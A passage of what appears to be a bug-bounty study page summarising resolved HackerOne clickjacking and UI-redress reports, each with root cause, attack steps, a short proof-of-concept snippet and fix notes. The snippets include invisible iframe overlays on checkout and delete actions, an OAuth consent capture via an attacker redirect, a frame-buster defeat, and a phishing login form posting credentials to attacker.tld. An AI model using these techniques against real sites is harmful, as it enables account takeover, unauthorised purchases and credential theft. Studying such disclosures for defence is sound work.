+<div class="taxo"><span>Program <b>wakatime</b></span><span>Surface <b>web</b></span><span>Chain <b>clickjacking -&gt; OAuth consent -&gt; auth code capture -&g</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OAuth authorization/consent pages that only defend against classic framing (X-Frame-Options/frame-ancestors) remain exploitable via double-click: an attacker page opens a popup, times the victim's two clicks so the first closes the decoy and the second lands on the real Authorize button underneath.</p>
+<h4>Method</h4><ol><li>Register an attacker OAuth app on the target with a redirect_uri you control (e.g. webhook.site)</li><li>Host a decoy page with a 'Double Click' button positioned over where the consent 'Authorize' button will render</li><li>On first click, close the decoy tab/window and simultaneously drive the current tab to the OAuth authorize URL</li><li>The victim's second click lands on the real Authorize button; capture the code at your redirect_uri and exchange it for a token</li></ol>
+<div class="pre">https://TARGET/oauth/authorize?client_id=ATTACKER_ID&amp;response_type=code&amp;redirect_uri=https://webhook.site/UUID&amp;scope=read_orgs,write_orgs</div>
+<p class="insight"><b>Insight —</b> X-Frame-Options/frame-ancestors do NOT stop DoubleClickjacking because no framing occurs. Test any one-click state-changing action (OAuth consent, 'delete', 'transfer') for double-click coercion. Fix = require a fresh gesture or disable the critical button until pointer/keyboard interaction.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3287060" target="_blank" rel="noopener">hackerone.com/reports/3287060</a></span><a class="src" href="#report-3287060" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-154963" style="--sv:var(--sev-med)" data-sev="2" data-votes="49" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Frameable lead-generation card leaks victim email on one click</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#154963</b> · x · awarded · 49 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Missing frame protection → clickjacked lead-gen submit → ema</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A lead-gen/marketing card page that auto-submits the logged-in user's account email/username to a configured endpoint is missing frame protection, so an attacker frames it and clickjacks the submit button to exfiltrate the victim's PII.</p>
+<h4>Method</h4><ol><li>Find an app 'card'/widget that, on a single button click, submits the authenticated user's stored email/username</li><li>Confirm the page lacks X-Frame-Options / frame-ancestors</li><li>Frame the card and overlay bait UI over its submit button</li><li>Victim's click submits their email/username to the attacker-controlled card destination</li></ol>
+<div class="pre">&lt;html&gt;
+&lt;iframe src="https://twitter.com/i/cards/tfw/v1/&lt;card_id&gt;?cardname=promotion&amp;autoplay_disabled=true&amp;earned=true&amp;lang=en&amp;card_height=357"&gt;&lt;/iframe&gt;
+&lt;/html&gt;</div>
+<p class="insight"><b>Insight —</b> Framing impact is highest on pages whose single click discloses or submits stored user data (lead-gen cards, 'share my info', prefilled forms). Hunt for widget/card endpoints that echo the logged-in user's email — a plain missing-XFO becomes real PII theft rather than a low-hanging nag.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/154963" target="_blank" rel="noopener">hackerone.com/reports/154963</a></span><a class="src" href="#report-154963" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-198622" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="560">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>X-Frame-Options ALLOW-FROM is unsupported → header present, zero protection</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#198622</b> · x · 560 · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>Ineffective ALLOW-FROM header → frameable page → clickjacked</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">X-Frame-Options: ALLOW-FROM &lt;uri&gt; is not supported by Chrome, Safari or IE; those browsers ignore the whole header, so a page that relies on ALLOW-FROM has no frame protection at all and every state-changing action on it is clickjackable.</p>
+<h4>Method</h4><ol><li>Grep responses for X-Frame-Options: ALLOW-FROM ... (or a frame-ancestors that omits the framing origin)</li><li>Load the target in an &lt;iframe&gt; in Chrome/Safari — if it renders, ALLOW-FROM is being ignored</li><li>Overlay bait over one-click actions (follow, deactivate, delete, settings change)</li><li>Optionally use a quickjack-style auto-align script to position the frame precisely over the target control</li></ol>
+<div class="pre">&lt;!-- Chrome ignores ALLOW-FROM, so this frames a 'protected' page --&gt;
+&lt;iframe src="https://vulnerable.site/action" frameborder="0"&gt;&lt;/iframe&gt;
+
+&lt;!-- quickjack auto-align + frame-buster defeat (from #658217) --&gt;
+&lt;script&gt;function t(e){window.setTimeout('stop();',10);}window.onbeforeunload=t;&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Presence of X-Frame-Options does NOT mean protected. Always read the value: ALLOW-FROM only works in Firefox/legacy Edge and is ignored elsewhere, and the modern replacement is CSP frame-ancestors. Test framing in Chrome specifically before dismissing a target as protected.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/198622" target="_blank" rel="noopener">hackerone.com/reports/198622</a></span><a class="src" href="#report-198622" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-463695" style="--sv:var(--sev-med)" data-sev="2" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking local AV warning pages to override cert/disable protections</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#463695</b> · kaspersky · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>kaspersky</b></span><span>Surface <b>desktop</b></span><span>Chain <b>MitM (public WiFi) → clickjacked AV cert-warning override → </b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Antivirus web-protection UIs (certificate-error, Safe Money, phishing-warning pages) are injected into the browser and are frameable, and their override action needs only a single click, so an attacker frames the AV warning page and clickjacks the victim into overriding a certificate warning or disabling protection — devastating when combined with a MitM position.</p>
+<h4>Method</h4><ol><li>On a MitM position (public WiFi), redirect the victim's plain-HTTP traffic to attacker content</li><li>Present a page masquerading as an AV network-warning that invites a single click</li><li>The click actually lands on the AV's framed certificate-error 'I understand the risks and wish to continue' link</li><li>The generic AV confirmation dialog ('go to insecure resource?') matches the pretext, so the victim confirms</li><li>Certificate warning for a high-profile HTTPS site is now permanently overridden; connection is hijackable</li></ol>
+<div class="pre">&lt;!-- frames the AV's own certificate-error page; overlay bait over the single override link --&gt;
+&lt;iframe src="about:av-cert-error-page" style="opacity:0;position:absolute"&gt;&lt;/iframe&gt;
+&lt;!-- attacker page text mimics the AV's out-of-band warning wording --&gt;</div>
+<p class="insight"><b>Insight —</b> Security software that renders its warnings in the browser DOM inherits web clickjacking risk. Single-click, irreversible security decisions (override cert, disable Safe Money, dismiss phishing warning) must require two clicks on different regions and must be un-frameable. As an attacker, look for locally-injected security UIs that can be framed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/463695" target="_blank" rel="noopener">hackerone.com/reports/463695</a></span><a class="src" href="#report-463695" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-212629" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via userinfo trick bypassing internal-link nofollow</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#212629</b> · gitlab · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Chain <b>Internal-link misclassification → target=_blank without noop</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The link filter decides a URL is 'internal' (and therefore skips adding rel="nofollow noreferrer" and safe target handling) by matching the host prefix, but https://gitlab.com@example.com is parsed as userinfo gitlab.com against host example.com — so the external destination is treated as internal and rendered with target=_blank and no noopener/noreferrer, enabling reverse tabnabbing.</p>
+<h4>Method</h4><ol><li>Find a link renderer that treats internal links differently (skips rel=nofollow/noreferrer, allows target=_blank)</li><li>Craft https://TRUSTED_HOST@attacker.tld so the trusted host is only the userinfo component</li><li>The naive host-prefix check treats it as internal and omits noopener/noreferrer</li><li>Victim opens it in a new tab; attacker page uses window.opener to rewrite the original tab to a phishing clone</li></ol>
+<div class="pre">&lt;a href="https://gitlab.com@example.com" target="_blank"&gt;Reverse Tabnabbing&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> URL parsers and 'is this our domain?' checks are frequently fooled by the userinfo @ separator (https://TRUSTED@evil.tld) — the same trick bypasses internal-link allowlists, SSRF host filters, and open-redirect validators. Any link that gets target=_blank without rel=noopener is a reverse-tabnabbing sink.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/212629" target="_blank" rel="noopener">hackerone.com/reports/212629</a></span><a class="src" href="#report-212629" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-965141" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking a review-management page to delete reviews</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#965141</b> · yelp · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The authenticated review-management page (/user_details_reviews_self) served no X-Frame-Options/frame-ancestors, so it can be embedded in a cross-origin iframe and its destructive 'remove review' control clickjacked.</p>
+<h4>Method</h4><ol><li>Frame https://www.yelp.com/user_details_reviews_self in an attacker page</li><li>Overlay/decoy UI so the victim's click lands on the review 'remove' control</li><li>Victim (logged in) clicks → their review is deleted</li></ol>
+<div class="pre">&lt;iframe style="width:100%;height:100%" src="https://www.yelp.com/user_details_reviews_self?"&gt;&lt;/iframe&gt;</div>
+<p class="insight"><b>Insight —</b> Frameability only matters when the framed page has a state-changing one-click action. Hunt for destructive GET/one-click actions (delete, unsubscribe, disconnect) on pages missing frame-ancestors — those turn a 'missing header' into a real medium.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/965141" target="_blank" rel="noopener">hackerone.com/reports/965141</a></span><a class="src" href="#report-965141" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-54733" style="--sv:var(--sev-med)" data-sev="2" data-votes="3" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML5 sandbox=allow-forms bypass of JS frame-buster / confirm() guard</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#54733</b> · coinbase · awarded · 3 votes · resolved</div>
+<div class="taxo"><span>Program <b>coinbase</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A page defends a sensitive button with JavaScript (data-confirm dialog / frame-busting script). Framing it inside a sandboxed iframe that omits allow-scripts disables all JavaScript in the framed document, so the confirmation/frame-buster never runs, yet native &lt;form&gt; submission still works — the guarded click goes through silently.</p>
+<h4>Method</h4><ol><li>Identify a sensitive action protected only by client-side JS (data-confirm, onclick guard, JS frame-buster).</li><li>Frame the target in a sandbox iframe granting allow-forms but NOT allow-scripts (and not allow-same-origin if not needed).</li><li>Overlay/transparent-align the sandboxed iframe over a decoy so the victim clicks the real submit control.</li><li>Click submits the form without triggering the disabled JS confirmation.</li></ol>
+<div class="pre">data:text/html,&lt;iframe sandbox="allow-forms" src="https://www.coinbase.com/checkouts/CHECKOUT_ID?c=TOKEN" style="opacity:0.1"&gt;&lt;/iframe&gt;</div>
+<p class="insight"><b>Insight —</b> When a target relies on JavaScript (confirm dialogs, data-confirm, frame-busting) as its only anti-clickjacking control, wrap it in a sandbox iframe WITHOUT allow-scripts: JS dies but HTML forms keep submitting. The only real fix is server-side framing headers (X-Frame-Options / CSP frame-ancestors), never client-side JS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/54733" target="_blank" rel="noopener">hackerone.com/reports/54733</a></span><a class="src" href="#report-54733" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-355859" style="--sv:var(--sev-med)" data-sev="2" data-votes="18" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking a state-changing form + browser autofill to exfiltrate PII</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#355859</b> · yelp · awarded · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The reservation page lacked X-Frame-Options/CSP frame-ancestors and performed a state-changing action; framed invisibly, browser autofill populates the victim's email/phone and a single click submits a reservation, forwarding the PII to the business.</p>
+<h4>Method</h4><ol><li>Attacker registers a business (or targets an existing one) to receive the reservation data</li><li>Embed /reservations as a transparent iframe over a decoy click target</li><li>Victim clicks; autofill fills PII and the reservation submits, leaking email/phone</li></ol>
+<p class="insight"><b>Insight —</b> Clickjacking is impactful only on framable pages that both change state and receive autofilled PII. Hunt for framable reservation/checkout/subscribe/invite flows rather than reporting missing X-Frame-Options on static pages.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/355859" target="_blank" rel="noopener">hackerone.com/reports/355859</a></span><a class="src" href="#report-355859" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-953579" style="--sv:var(--sev-low)" data-sev="1" data-votes="31" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking as a delivery vector for otherwise-unreachable self-DOM-XSS</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#953579</b> · automattic · awarded · 31 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>web</b></span><span>Chain <b>Clickjacking (frameable console) → guided victim input → sel</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A self-only DOM XSS (user must paste a payload into an API console field that flows to n.html()) is normally non-exploitable, but the console page is frameable, so clickjacking drives the victim through the paste/submit steps and converts self-XSS into a real cross-user attack.</p>
+<h4>Method</h4><ol><li>Identify a self-DOM-XSS where victim-supplied text reaches a sink like $(...).html(text)</li><li>Note the vulnerable sink: console.js builds n.html('"&lt;u&gt;' + t + '&lt;/u&gt;"') from field text</li><li>Because the console page has no frame protection, frame it and clickjack the victim into typing/selecting the payload and clicking the action</li><li>Payload executes in the victim's authenticated origin</li></ol>
+<div class="pre">self-DOM-XSS input:  https://www.&lt;img src=x onerror='alert(document.domain)'&gt;
+sink (console.js:1309):  n.html('"&lt;u&gt;' + t + '&lt;/u&gt;"')</div>
+<p class="insight"><b>Insight —</b> Never dismiss a 'self-XSS' as unexploitable until you check whether the page is frameable or otherwise driveable — clickjacking (or drag-and-drop) is the standard bridge that turns self-XSS into stored/reflected-grade impact.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/953579" target="_blank" rel="noopener">hackerone.com/reports/953579</a></span><a class="src" href="#report-953579" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-316290" style="--sv:var(--sev-low)" data-sev="1" data-votes="16" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cross-tab field prepopulation + 0-opacity frame leaks PII on click</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#316290</b> · coinbase · awarded · 16 votes · resolved</div>
+<div class="taxo"><span>Program <b>coinbase</b></span><span>Surface <b>web</b></span><span>Chain <b>Field prepopulation across tabs → 0-opacity frame → stolen c</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A commerce widget persists a user's previously entered name/email and auto-prepopulates those fields in any new instance (any merchant, any tab); an attacker frames the widget at 0 opacity so a victim who once used it and then clicks the invisible frame submits their prefilled PII to a charge configured by the attacker's merchant.</p>
+<h4>Method</h4><ol><li>Confirm the widget prepopulates PII fields from a prior session across tabs/merchants</li><li>Embed the widget in an attacker page with opacity:0 over bait UI</li><li>Victim who previously reached the name/email step has fields auto-filled</li><li>Victim's click on the bait submits the prefilled name/email into an attacker-controlled charge</li></ol>
+<div class="pre">&lt;iframe src="https://commerce.widget.tld/checkout?to=ATTACKER_MERCHANT" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"&gt;&lt;/iframe&gt;
+&lt;!-- bait button positioned under the widget's submit control --&gt;</div>
+<p class="insight"><b>Insight —</b> Autofill/prepopulation across origins or tabs turns a plain clickjack into data exfiltration: the victim doesn't type anything — the app pre-fills their PII and the stolen click submits it. When auditing widgets/checkouts, test whether fields persist and prefill in a fresh framed instance.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/316290" target="_blank" rel="noopener">hackerone.com/reports/316290</a></span><a class="src" href="#report-316290" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-214087" style="--sv:var(--sev-low)" data-sev="1" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking on state-changing pages missing X-Frame-Options</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#214087</b> · yelp · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">X-Frame-Options SAMEORIGIN is set on most pages but not applied consistently, leaving state-changing pages framable and abusable via transparent-overlay UI redress.</p>
+<h4>Method</h4><ol><li>Enumerate pages and diff X-Frame-Options / CSP frame-ancestors coverage; find framable state-changing pages.</li><li>Frame the target page transparently (opacity:0) over decoy clickable UI.</li><li>Bait the victim into clicks that perform real actions: bookmark business, add event to profile, edit review rating.</li></ol>
+<div class="pre">&lt;style&gt;iframe{opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2}&lt;/style&gt;
+&lt;button&gt;Claim your prize&lt;/button&gt;
+&lt;iframe src="https://www.yelp.com/&lt;state-changing-page&gt;"&gt;&lt;/iframe&gt;</div>
+<p class="insight"><b>Insight —</b> Clickjacking is only a finding when the framed page performs a state change. Test frame protection per-page, not site-wide: a single unprotected settings/action page is enough. Multi-click flows still work because a baited user keeps clicking.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/214087" target="_blank" rel="noopener">hackerone.com/reports/214087</a></span><a class="src" href="#report-214087" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-244697" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Automated multi-click PoC via Burp Clickbandit (postMessage frame alignment)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#244697</b> · wakatime · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>wakatime</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A framable page with a multi-step click sequence can be exploited by a recorded, self-realigning clickjacking PoC: a data: URI wrapper iframe repositions the target iframe via postMessage between clicks, walking the victim through several precise clicks while a decoy button follows the cursor.</p>
+<h4>Method</h4><ol><li>Confirm the target lacks X-Frame-Options / frame-ancestors on the embeddable endpoint (e.g. /share/embed).</li><li>Record the intended click sequence with Burp Clickbandit to capture per-click coordinates/sizes (clickTracking array).</li><li>Serve the generated page: a base64 data:text/html wrapper iframe holds the target and listens for postMessage to set width/height/left/top, realigning to each recorded click.</li><li>On each blur/click the script advances currentPosition and repositions the frame + decoy button for the next click.</li></ol>
+<div class="pre">&lt;iframe id="parentFrame" src="data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIC4uLiI+PGlmcmFtZSBzcmM9Imh0dHBzOi8vd2FrYXRpbWUuY29tL3NoYXJlL2VtYmVkIiAuLi4+" style="opacity:0.5;position:absolute;z-index:1"&gt;&lt;/iframe&gt;
+&lt;!-- window.clickbandit.config.clickTracking = [{width,height,left,top,documentWidth,documentHeight}, ...] drives realignment via postMessage --&gt;</div>
+<p class="insight"><b>Insight —</b> For multi-step clickjacking, don't hand-align pixels — generate the PoC with Burp Clickbandit, which records the click path and emits a self-realigning postMessage wrapper. Even 'low impact' embed widgets are worth checking for framing headers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/244697" target="_blank" rel="noopener">hackerone.com/reports/244697</a></span><a class="src" href="#report-244697" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-391385" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking a framable checkout/purchase endpoint</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#391385</b> · yelp · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The /checkout/deal purchase page sets no X-Frame-Options/CSP frame-ancestors, so it can be embedded as a hidden iframe and the victim's click hijacked to complete a purchase against their saved card (a state-changing, monetary action).</p>
+<h4>Method</h4><ol><li>Embed the deal/checkout URL in a transparent, overlaid iframe on an attacker page</li><li>Position an enticing decoy button under the framed Purchase button</li><li>Victim (logged in) clicks -&gt; purchase is completed with their stored card</li></ol>
+<div class="pre">&lt;iframe style="opacity:0;position:absolute;z-index:2" src="https://www.yelp.com/checkout/deal/DEALID?biz_id=BIZ&amp;return_url=/"&gt;&lt;/iframe&gt;
+&lt;button style="position:absolute;z-index:1"&gt;Click to win&lt;/button&gt;</div>
+<p class="insight"><b>Insight —</b> Clickjacking is only worth reporting when the framed page performs a state-changing action. Purchase/checkout, add-payment, delete-account and OAuth-authorize pages missing frame-ancestors are the high-impact targets - fixed here by X-Frame-Options + site-wide CSP.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/391385" target="_blank" rel="noopener">hackerone.com/reports/391385</a></span><a class="src" href="#report-391385" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-305128" style="--sv:var(--sev-low)" data-sev="1" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Clickjacking state-changing GET endpoints to bypass CSRF tokens</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#305128</b> · yelp · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>yelp</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Sensitive state-changing actions were exposed as parameterized GET URLs on pages lacking framing protection, so an attacker frames the authenticated page and overlays a decoy control; the click submits the action with the victim's session and no user-visible CSRF token is needed.</p>
+<h4>Method</h4><ol><li>Enumerate state-changing endpoints reachable by GET or by a single framed click (report user, follow user, send compliment, change email/role, delete resource).</li><li>Confirm the target page returns no X-Frame-Options / CSP frame-ancestors and can be framed.</li><li>Embed the authenticated page in a hidden/low-opacity iframe and align a bait button (opacity 0 iframe over visible decoy, or visible iframe under transparent decoy).</li><li>Pre-load attacker-controlled parameters (e.g. custom abuse message) so a single victim click triggers the full action.</li></ol>
+<div class="pre">https://www.yelp.com/flag_content?message=This%20person%20is%20abusive&amp;flag_id=ID&amp;flag_type=user_profile&amp;previous_url=/user_details?userid=ID
+https://www.yelp.com/following_user/add?dst_user_id=ID&amp;previous_url=/user_details?userid=ID
+https://www.yelp.com/thanx?message=go%20to%20hell&amp;previous_url=/user_details?userid=ID&amp;user_id=ID
+
+&lt;iframe src="TARGET_STATE_CHANGING_URL" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2"&gt;&lt;/iframe&gt;
+&lt;button style="position:absolute;top:330px;left:100px;z-index:1"&gt;Click me&lt;/button&gt;</div>
+<p class="insight"><b>Insight —</b> Clickjacking bypasses CSRF-token protection because the request rides inside the real page. Prioritize framed pages that expose one-click/GET state changes (follow, delete, change email, change role, privacy toggles). Note the timeline: X-Frame-Options: SAMEORIGIN did NOT cover all cases here — CSP frame-ancestors was the real fix. Always re-test mobile (m.) subdomains separately; they frequently ship without the framing headers the desktop site has.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/305128" target="_blank" rel="noopener">hackerone.com/reports/305128</a></span><a class="src" href="#report-305128" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-285609" style="--sv:var(--sev-low)" data-sev="1" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML sanitizer blocklist bypass via frameset/frame tags</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#285609</b> · khanacademy · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>khanacademy</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A rich-text/HTML editor blocklisted iframe/object/embed but forgot the legacy frameset/frame tags, allowing an attacker to embed another same-origin page (e.g. user settings) despite X-Frame-Options: SAMEORIGIN, enabling stored/same-origin clickjacking.</p>
+<h4>Method</h4><ol><li>Find a user-controlled HTML sink (editor, comment, profile) that filters framing tags.</li><li>Test the blocklist coverage: iframe/object/embed may be blocked while frameset/frame/portal/svg-foreignObject are not.</li><li>Inject &lt;frameset&gt;&lt;frame src="/settings"&gt;&lt;/frameset&gt; to load a sensitive same-origin page (SAMEORIGIN permits same-origin framing).</li><li>Overlay decoys for clickjacking or use it for UI redress within the app.</li></ol>
+<div class="pre">&lt;frameset&gt;&lt;frame src="https://www.khanacademy.org/settings"&gt;&lt;/frameset&gt;</div>
+<p class="insight"><b>Insight —</b> Sanitizer blocklists are almost always incomplete — when iframe/object/embed are rejected, try the legacy frameset/frame tags (and portal, svg foreignObject). X-Frame-Options: SAMEORIGIN does not stop same-origin framing, so an in-app HTML injection can still frame sensitive same-origin pages.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/285609" target="_blank" rel="noopener">hackerone.com/reports/285609</a></span><a class="src" href="#report-285609" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-289823" style="--sv:var(--sev-none)" data-sev="0" data-votes="19" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unsanitized note rendering → in-app phishing login form</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#289823</b> · automattic · awarded · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>automattic</b></span><span>Surface <b>desktop</b></span><span>Chain <b>Unsanitized HTML render → embedded phishing form/iframe → cr</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A notes/markdown app renders user-authored HTML in its preview pane without sanitization, letting an attacker embed a full &lt;form&gt; (or an &lt;iframe&gt; to an external login page) that looks like a native app login prompt and POSTs the victim's credentials to a third-party server.</p>
+<h4>Method</h4><ol><li>Author a note containing raw HTML: a styled &lt;form action=attacker.tld&gt; with email/password inputs, or an &lt;iframe&gt; to an attacker login page</li><li>Share/sync the note so it renders in the victim's preview pane</li><li>Hide the form beneath legitimate-looking text (or inside HTML comments that vanish in preview) to disguise the note as a document</li><li>Optionally style the app to look 'crashed' and prompt re-login; victim submits credentials to attacker</li></ol>
+<div class="pre">&lt;h1 class="signin"&gt;Please sign in&lt;/h1&gt;
+&lt;form action="https://attacker.tld/login.php" name="login"&gt;
+  &lt;input name="email" type="email" placeholder="Email" required&gt;
+  &lt;input name="password" type="password" required&gt;
+  &lt;input class="submit button" value="Sign In" type="submit"&gt;
+&lt;/form&gt;
+
+&lt;!-- iframe variant (Simplenote/Electron): fix is CSP frame-src 'none' --&gt;
+&lt;iframe src="https://attacker.tld/simplenote-login.html" frameborder=0&gt;&lt;/iframe&gt;</div>
